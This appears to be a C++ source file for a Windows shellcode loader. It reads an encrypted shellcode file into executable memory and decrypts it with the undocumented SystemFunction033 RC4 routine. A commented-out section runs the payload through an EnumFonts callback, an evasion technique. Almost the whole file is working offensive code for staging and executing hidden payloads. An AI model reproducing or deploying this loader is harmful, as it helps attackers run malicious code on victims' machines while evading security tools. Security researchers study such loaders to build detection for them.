#include <windows.h>
#include <Winbase.h>
#include <iostream>
#include <string>
// #include "shellcode.h"

#pragma warning(disable:4996)

using namespace std;

#define MAXSHELLCODESIZE 4096

/*
 * RC4 Shellcode Decrypter using Systemfunction032/033
 * Coded by: @OsandaMalith - www.osandamalith.com
 */
typedef NTSTATUS(WINAPI* _SystemFunction032)(
	struct ustring *memoryRegion,
	struct ustring *keyPointer);

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring *memoryRegion,
	struct ustring *keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int main(int argc, char **argv) {
	_SystemFunction032 SystemFunction032 = (_SystemFunction032)GetProcAddress(LoadLibrary("advapi32"), "SystemFunction032");
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary("advapi32"), "SystemFunction033");

	char _key[] = "advapi32.dll";
	unsigned char buf[MAXSHELLCODESIZE + 1];
	unsigned int  bytesread;
	FILE *fp;
	int i;

	if (argc < 2 || argc > 3) {
		fprintf(stderr, "Wrong number of arguments: %s INPUTFILENAME (e.g. shellcode.bin)\n", argv[0]);
		return 0;
	}

	char *infile = argv[1];

	if ((fp = fopen(infile, "rb")) == NULL) {
		fprintf(stderr, "Cannot open input file %s\n", infile);
		exit(1);
	}

	if ((bytesread = fread(buf, sizeof(char), MAXSHELLCODESIZE, fp)) == 0) {
		if (ferror(fp)) {
			fprintf(stderr, "File %s read error %d\n", infile, errno);
		}
		else {
			fprintf(stderr, "File %s is empty\n", infile);
		}
		fclose(fp);
		exit(1);
	}

	fclose(fp);

	printf("key length is %d\n", sizeof _key);
	printf("shellcode length is %d, %d\n", bytesread, sizeof buf);

	PVOID buffer = VirtualAlloc(NULL, bytesread, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// Copy the character array to the allocated memory using memcpy.
	std::memcpy(buffer, buf, bytesread);

	//just setting null values at shellcode, cause why not 
	//memset(shellcode, 0, shellcode_size);

	//Setting key values
	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof(_key);
	key.MaximumLength = sizeof(_key);

	//Setting shellcode in the struct for Systemfunction033
	_data.Buffer = (PUCHAR)buffer;
	_data.Length = bytesread;
	_data.MaximumLength = bytesread;

	fprintf(stderr, "encrypted data:\n");
	for (i = 0; i < bytesread; i++) {
		fprintf(stderr, "0x%02x ", ((unsigned char *)buffer)[i]);
	}
	fprintf(stderr, "\n");

	//Calling Systemfunction033
	SystemFunction033(&_data, &key);

	fprintf(stderr, "decrypted data:\n");
	for (i = 0; i < bytesread; i++) {
		fprintf(stderr, "0x%02x ", ((unsigned char *)buffer)[i]);
	}
	fprintf(stderr, "\n");

/*
	printf("key length is %d\n", sizeof _key);
	printf("shellcode length is %d\n", shellcode_size);

	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof key;

	_data.Buffer = (PUCHAR)shellcode;
	_data.Length = shellcode_size;

	fprintf(stderr, "encrypted data:\n");
	for (i = 0; i < shellcode_size; i++) {
		fprintf(stderr, "0x%02x ", shellcode[i]);
	}
	fprintf(stderr, "\n");

	// SystemFunction032(&_data, &key);
	SystemFunction033(&_data, &key);

	fprintf(stderr, "decrypted data:\n");
	for (i = 0; i < shellcode_size; i++) {
		fprintf(stderr, "0x%02x ", shellcode[i]);
	}
	fprintf(stderr, "\n");

	DWORD oldProtect = 0;
	BOOL ret = VirtualProtect((LPVOID)shellcode, sizeof shellcode, PAGE_EXECUTE_READWRITE, &oldProtect);

	EnumFonts(GetDC(0), (LPCWSTR)0, (FONTENUMPROC)(char*)shellcode, 0);
*/
}